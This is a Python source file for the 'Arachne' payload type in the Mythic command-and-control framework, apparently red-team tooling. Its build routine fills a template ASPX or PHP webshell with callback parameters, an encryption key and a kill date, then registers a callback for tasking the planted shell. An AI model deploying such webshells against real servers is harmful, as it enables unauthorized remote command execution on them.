from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class Arachne(PayloadType):
    name = "arachne"
    file_extension = ""
    author = "@Airzero24, @its_a_feature_"
    supported_os = [
        SupportedOS.Windows, SupportedOS.Linux
    ]
    wrapper = False
    wrapped_payloads = []
    note = """
    This payload uses C# to create a webshell targeting Windows IIS servers capable of executing ASPX web pages.
    This payload optionally creates a PHP webshell with a different set of functionalities.
    """
    supports_dynamic_loading = False
    mythic_encrypts = True
    translation_container = "arachne_translator"
    agent_path = pathlib.Path(".") / "arachne"
    agent_icon_path = agent_path / "agent_functions" / "arachne.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(name="aespsk",
                       description="Encryption Type",
                       parameter_type=BuildParameterType.ChooseOne,
                       choices=["aes256_hmac", "none"],
                       crypto_type=True,
                       default_value="aes256_hmac"),
        BuildParameter(name="killdate",
                       description="Kill Date",
                       parameter_type=BuildParameterType.Date,
                       default_value=365,
                       required=False),
    ]
    c2_profiles = ["webshell"]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Error)
        try:
            if self.selected_os == "Windows":
                file1 = open(f"{self.agent_code_path}/arachne.aspx", 'r').read()
                if not self.filename.endswith(".aspx"):
                    resp.updated_filename = self.filename + ".aspx"
            elif self.selected_os == "Linux":
                file1 = open(f"{self.agent_code_path}/arachne.php", "r").read()
                if not self.filename.endswith(".php"):
                    resp.updated_filename = self.filename + ".php"
            else:
                resp.build_stderr = f"Unknown payload os: {self.selected_os}"
                return resp
            if len(self.c2info) == 0:
                resp.build_message = "Must include the `webshell` c2 with communication parameters"
                return resp
            if len(self.c2info) > 1:
                resp.build_message = "Can't include more than one c2 profile currently"
                return resp
            file1 = file1.replace("%UUID%", self.uuid)
            remote_url = ""
            for c2 in self.c2info:
                try:
                    profile = c2.get_c2profile()
                    if profile["name"] != "webshell":
                        resp.build_message = "Must include the `webshell` c2 profile"
                        return resp
                    c2_dict = c2.get_parameters_dict()
                    file1 = file1.replace('%PARAM%', c2_dict["query_param"])
                    file1 = file1.replace('%COOKIE%', c2_dict["cookie_name"])
                    file1 = file1.replace('%USER_AGENT%', c2_dict['user_agent'])
                    remote_url = c2_dict["url"]
                except Exception as e:
                    resp.build_stderr = str(e)
                    return resp
            file1 = file1.replace('%KILLDATE%', self.get_parameter("killdate"))
            if self.get_parameter("aespsk")["value"] == "aes256_hmac":
                file1 = file1.replace('%AESPSK%', self.get_parameter("aespsk")["enc_key"])
            else:
                file1 = file1.replace('%AESPSK%', "")
            resp.payload = file1
            resp.status = BuildStatus.Success
            create_callback = await SendMythicRPCCallbackCreate(MythicRPCCallbackCreateMessage(
                PayloadUUID=self.uuid,
                C2ProfileName="webshell",
            ))
            resp.build_message = f"An initial callback is automatically created and tasking that callback will try to reach out directly to {remote_url} to issue tasking."
            resp.build_message += f"\nLink to this callback from another agent in order to task {remote_url} from that agent."
            resp.build_message += f"\nUnlink all other callbacks from this callback in order to have the payload type container reach out directly to {remote_url} again."
            if not create_callback.Success:
                logger.info(create_callback.Error)
            else:
                logger.info(create_callback.CallbackUUID)
        except Exception as e:
            resp.message = "Error building payload: " + str(e)
            resp.build_stderr = str(e)
        return resp

    async def on_new_callback(self, newCallback: PTOnNewCallbackAllData) -> PTOnNewCallbackResponse:
        logger.info("new callback")
        return PTOnNewCallbackResponse(AgentCallbackID=newCallback.Callback.AgentCallbackID, Success=True)

